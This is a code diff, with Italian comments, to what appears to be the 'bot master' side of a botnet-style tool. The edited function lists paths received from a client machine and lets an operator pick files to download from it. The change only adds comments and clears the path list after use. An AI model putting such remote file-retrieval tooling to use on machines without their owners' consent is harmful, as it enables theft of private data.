@@ -34,7 +34,7 @@ __filesystem_hierarchy_components = {"1": "Home", "2": "Images", "3": "Documents
 
 __file_range_header = {1: "<Range-File>", 2: "<File-Name>"}
 
-content_dir = []
+content_dir = []  # Container dei path ricevuti dal client che verrà utilizzato per la selezione dei file da scaricare
 
 __buffer_size = 8192
 
@@ -124,7 +124,6 @@ async def ask_operation(writer: asyncio.StreamWriter) -> None:
         loop.close()
 
 
-# TODO: Svuotare la lista alla fine del metodo (evitiamo di avere file duplicati o liste potenzialmente enormi)
 async def ask_file_name_to_download(writer: asyncio.StreamWriter) -> None:
     """Gestione della richiesta del recupero di un file presente sulla macchina dove viene eseguito il client."""
     bot_master_utils.print_menu_with_list(content_dir, "Path disponibili:", 70)
@@ -155,7 +154,11 @@ async def ask_file_name_to_download(writer: asyncio.StreamWriter) -> None:
                 # TODO: Svuotare la lista nel caso in cui non si fosse chiesto il download di tutti i file
             else:
                 writer.write(operation_not_supported.encode())
-                await writer.drain()  # Attendiamo che venga eseguito il flush del writer prima di proseguire
+
+        # In questo punto svuotiamo la lista (La selezione da parte dell'utente è già avvenuta -> Risulta inutile tenere in memoria informazioni non più utilizzabili)
+        # Evitiamo così anche di avere file duplicati o liste potenzialmente enormi (nel caso in cui venga richiesto più di una volta il recupero di uno specifico path)
+        content_dir.clear()
+        await writer.drain()  # Attendiamo che venga eseguito il flush del writer prima di proseguire
     except Exception as e:
         bot_master_utils.info(f"{type(e)}: {e}", 2)
 
